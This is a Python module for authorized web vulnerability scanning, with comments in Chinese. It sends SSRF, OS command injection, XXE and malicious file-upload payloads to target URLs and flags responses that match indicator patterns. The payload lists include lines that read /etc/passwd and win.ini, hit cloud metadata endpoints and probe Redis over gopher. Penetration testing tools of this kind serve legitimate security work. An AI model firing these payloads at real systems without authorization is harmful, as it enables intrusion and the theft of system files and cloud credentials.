"""
advanced_web_tools模块，提供相关安全测试功能。

模块功能：
    - 提供相关安全测试功能
    - 支持API调用和命令行使用
    - 与其他模块集成协作

注意事项：
    - 本模块仅用于授权的安全测试
    - 请勿用于非法用途
    - 使用前请确保已获得相关授权
"""
import asyncio
import re
from typing import Dict, List, Optional
from urllib.parse import urlparse, urljoin, parse_qs, urlencode
from utils.logger import log
from utils.helpers import validate_target, rate_limit


class AdvancedWebTools:
    """高级Web安全测试工具集合"""

    # SSRF测试Payload
    SSRF_PAYLOADS = [
        "http://127.0.0.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://[::1]",
        "http://169.254.169.254/latest/meta-data/",  # AWS元数据
        "http://169.254.169.254/computeMetadata/v1/",  # GCP元数据
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:6379/INFO",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    # 命令注入Payload
    CMD_INJECTION_PAYLOADS = [
        "; id",
        "| id",
        "&& id",
        "|| id",
        "$(id)",
        "`id`",
        "; whoami",
        "| whoami",
        "; uname -a",
        "| cat /etc/passwd",
        "; cat /etc/passwd",
        "%0a id",
        "%0d%0a id",
    ]

    # 文件上传测试
    FILE_UPLOAD_EXTENSIONS = [
        ".php", ".php3", ".php4", ".php5", ".phtml",
        ".asp", ".aspx", ".jsp", ".jspx",
        ".exe", ".sh", ".bat", ".cmd",
        ".svg", ".html", ".htm",
    ]

    # XXE Payload
    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
    ]

    def __init__(self):
        """初始化AdvancedWebTools实例。

        Args:
            self: 类实例。
        """
        self.findings = []

    @rate_limit()
    async def ssrf_test(self, url: str, param: str) -> Dict:
        """
        SSRF（服务端请求伪造）测试
        测试URL参数是否存在SSRF漏洞
        """
        if not validate_target(url):
            return {"error": "目标不在授权白名单内，操作已拒绝"}

        log.info(f"SSRF测试: {url}, 参数: {param}")
        import aiohttp

        vulnerabilities = []

        for payload in self.SSRF_PAYLOADS[:6]:
            try:
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                query_params[param] = [payload]
                test_url = parsed._replace(query=urlencode(query_params, doseq=True)).geturl()

                async with aiohttp.ClientSession() as session:
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10), allow_redirects=False) as resp:
                        body = await resp.text()
                        status = resp.status

                        # 检测SSRF特征
                        ssrf_indicators = [
                            ("root:x:0:0", "/etc/passwd内容"),
                            ("[fonts]", "win.ini内容"),
                            ("ami-id", "AWS元数据"),
                            ("computeMetadata", "GCP元数据"),
                            ("redis_version", "Redis响应"),
                        ]

                        found_indicator = None
                        for indicator, desc in ssrf_indicators:
                            if indicator in body:
                                found_indicator = desc
                                break

                        if found_indicator or (status == 200 and len(body) > 100 and "error" not in body.lower()):
                            vulnerabilities.append({
                                "payload": payload,
                                "status_code": status,
                                "response_length": len(body),
                                "indicator": found_indicator or "响应异常",
                                "confidence": "High" if found_indicator else "Medium",
                            })
                            log.warning(f"疑似SSRF: {payload} ({found_indicator or '响应异常'})")

                await asyncio.sleep(0.5)
            except Exception as e:
                log.debug(f"SSRF测试异常: {e}")

        result = {
            "url": url,
            "param": param,
            "test_type": "SSRF",
            "tested_payloads": len(self.SSRF_PAYLOADS[:6]),
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "is_vulnerable": len(vulnerabilities) > 0,
        }
        log.info(f"SSRF测试完成: {url}, 发现 {len(vulnerabilities)} 个疑似漏洞")
        return result

    @rate_limit()
    async def idor_test(self, url: str, param: str, start_id: int = 1, end_id: int = 10) -> Dict:
        """
        IDOR（不安全的直接对象引用）测试
        测试通过修改ID参数是否能访问未授权资源
        """
        if not validate_target(url):
            return {"error": "目标不在授权白名单内，操作已拒绝"}

        log.info(f"IDOR测试: {url}, 参数: {param}, 范围: {start_id}-{end_id}")
        import aiohttp

        results = []
        baseline = None

        # 获取基线响应（第一个ID）
        try:
            parsed = urlparse(url)
            query_params = parse_qs(parsed.query)
            query_params[param] = [str(start_id)]
            baseline_url = parsed._replace(query=urlencode(query_params, doseq=True)).geturl()

            async with aiohttp.ClientSession() as session:
                async with session.get(baseline_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    baseline = {
                        "status": resp.status,
                        "length": len(await resp.read()),
                        "content_type": resp.headers.get("Content-Type", ""),
                    }
        except Exception as e:
            return {"url": url, "param": param, "error": f"基线请求失败: {e}"}

        # 测试不同ID
        for test_id in range(start_id + 1, end_id + 1):
            try:
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                query_params[param] = [str(test_id)]
                test_url = parsed._replace(query=urlencode(query_params, doseq=True)).geturl()

                async with aiohttp.ClientSession() as session:
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.read()
                        current = {
                            "id": test_id,
                            "status": resp.status,
                            "length": len(body),
                            "content_type": resp.headers.get("Content-Type", ""),
                        }

                        # 检测IDOR特征：不同ID返回相似结构但不同数据
                        length_diff = abs(current["length"] - baseline["length"])
                        similar_structure = (
                            current["status"] == baseline["status"] and
                            current["content_type"] == baseline["content_type"] and
                            length_diff < baseline["length"] * 0.5
                        )

                        if similar_structure and current["length"] > 0:
                            current["idor_suspected"] = True
                            current["confidence"] = "Medium"
                            log.warning(f"疑似IDOR: ID={test_id}, 长度={current['length']}")
                        else:
                            current["idor_suspected"] = False

                        results.append(current)

                await asyncio.sleep(0.3)
            except Exception as e:
                log.debug(f"IDOR测试异常 (ID={test_id}): {e}")

        idor_count = sum(1 for r in results if r.get("idor_suspected"))

        result = {
            "url": url,
            "param": param,
            "test_type": "IDOR",
            "id_range": f"{start_id}-{end_id}",
            "baseline": baseline,
            "tested_count": len(results),
            "idor_suspected_count": idor_count,
            "results": results,
            "is_vulnerable": idor_count > 0,
            "note": "IDOR需要结合业务逻辑判断，疑似结果需人工验证",
        }
        log.info(f"IDOR测试完成: {url}, 疑似 {idor_count} 个")
        return result

    @rate_limit()
    async def command_injection_test(self, url: str, param: str) -> Dict:
        """
        命令注入测试
        测试URL参数是否存在操作系统命令注入漏洞
        """
        if not validate_target(url):
            return {"error": "目标不在授权白名单内，操作已拒绝"}

        log.info(f"命令注入测试: {url}, 参数: {param}")
        import aiohttp

        vulnerabilities = []

        for payload in self.CMD_INJECTION_PAYLOADS[:8]:
            try:
                parsed = urlparse(url)
                query_params = parse_qs(parsed.query)
                query_params[param] = [payload]
                test_url = parsed._replace(query=urlencode(query_params, doseq=True)).geturl()

                async with aiohttp.ClientSession() as session:
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()

                        # 检测命令执行特征
                        cmd_indicators = [
                            (r"uid=\d+\([^)]+\)", "id命令输出"),
                            (r"root:x:0:0", "/etc/passwd内容"),
                            (r"Linux\s+\S+\s+\d+\.\d+\.\d+", "uname输出"),
                            (r"^\s*\S+\s+PID", "进程列表"),
                        ]

                        found_indicator = None
                        for pattern, desc in cmd_indicators:
                            if re.search(pattern, body):
                                found_indicator = desc
                                break

                        if found_indicator:
                            vulnerabilities.append({
                                "payload": payload,
                                "status_code": resp.status,
                                "indicator": found_indicator,
                                "confidence": "High",
                            })
                            log.warning(f"疑似命令注入: {payload} ({found_indicator})")

                await asyncio.sleep(0.5)
            except Exception as e:
                log.debug(f"命令注入测试异常: {e}")

        result = {
            "url": url,
            "param": param,
            "test_type": "Command Injection",
            "tested_payloads": len(self.CMD_INJECTION_PAYLOADS[:8]),
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "is_vulnerable": len(vulnerabilities) > 0,
        }
        log.info(f"命令注入测试完成: {url}, 发现 {len(vulnerabilities)} 个疑似漏洞")
        return result

    async def file_upload_test(self, upload_url: str, file_field: str = "file") -> Dict:
        """
        文件上传漏洞测试
        测试上传点是否允许上传危险文件类型
        """
        if not validate_target(upload_url):
            return {"error": "目标不在授权白名单内，操作已拒绝"}

        log.info(f"文件上传测试: {upload_url}")
        import aiohttp

        results = []

        # 测试各种扩展名
        test_content = "<?php echo 'test'; ?>"
        test_filename = "test.php"

        for ext in self.FILE_UPLOAD_EXTENSIONS[:8]:
            try:
                filename = f"test{ext}"
                data = aiohttp.FormData()
                data.add_field(file_field, test_content, filename=filename, content_type="application/octet-stream")

                async with aiohttp.ClientSession() as session:
                    async with session.post(upload_url, data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()
                        result = {
                            "extension": ext,
                            "filename": filename,
                            "status_code": resp.status,
                            "response_length": len(body),
                            "uploaded": resp.status in [200, 201],
                            "response_preview": body[:200],
                        }

                        # 检测上传成功特征
                        if resp.status in [200, 201] and ("success" in body.lower() or "upload" in body.lower()):
                            result["potential_vulnerability"] = True
                            result["confidence"] = "Medium"
                            log.warning(f"疑似文件上传漏洞: {ext}")

                        results.append(result)

                await asyncio.sleep(0.5)
            except Exception as e:
                log.debug(f"文件上传测试异常 ({ext}): {e}")
                results.append({"extension": ext, "error": str(e)})

        vuln_count = sum(1 for r in results if r.get("potential_vulnerability"))

        result = {
            "upload_url": upload_url,
            "file_field": file_field,
            "test_type": "File Upload",
            "tested_extensions": len(self.FILE_UPLOAD_EXTENSIONS[:8]),
            "vulnerability_count": vuln_count,
            "results": results,
            "is_vulnerable": vuln_count > 0,
            "note": "文件上传漏洞需验证上传后文件是否可被访问执行",
        }
        log.info(f"文件上传测试完成: {upload_url}, 疑似 {vuln_count} 个")
        return result

    async def xxe_test(self, url: str) -> Dict:
        """
        XXE（XML外部实体注入）测试
        测试接受XML输入的端点是否存在XXE漏洞
        """
        if not validate_target(url):
            return {"error": "目标不在授权白名单内，操作已拒绝"}

        log.info(f"XXE测试: {url}")
        import aiohttp

        vulnerabilities = []

        for payload in self.XXE_PAYLOADS:
            try:
                headers = {"Content-Type": "application/xml"}
                async with aiohttp.ClientSession() as session:
                    async with session.post(url, data=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
                        body = await resp.text()

                        xxe_indicators = [
                            ("root:x:0:0", "/etc/passwd内容"),
                            ("[fonts]", "win.ini内容"),
                            ("127.0.0.1", "内网请求特征"),
                        ]

                        found_indicator = None
                        for indicator, desc in xxe_indicators:
                            if indicator in body:
                                found_indicator = desc
                                break

                        if found_indicator or (resp.status == 200 and "error" not in body.lower() and len(body) > 50):
                            vulnerabilities.append({
                                "payload_preview": payload[:100],
                                "status_code": resp.status,
                                "indicator": found_indicator or "响应异常",
                                "confidence": "High" if found_indicator else "Low",
                            })
                            log.warning(f"疑似XXE: {found_indicator or '响应异常'}")

                await asyncio.sleep(0.5)
            except Exception as e:
                log.debug(f"XXE测试异常: {e}")

        result = {
            "url": url,
            "test_type": "XXE",
            "tested_payloads": len(self.XXE_PAYLOADS),
            "vulnerability_count": len(vulnerabilities),
            "vulnerabilities": vulnerabilities,
            "is_vulnerable": len(vulnerabilities) > 0,
        }
        log.info(f"XXE测试完成: {url}, 发现 {len(vulnerabilities)} 个疑似漏洞")
        return result


# 全局实例
advanced_web_tools = AdvancedWebTools()
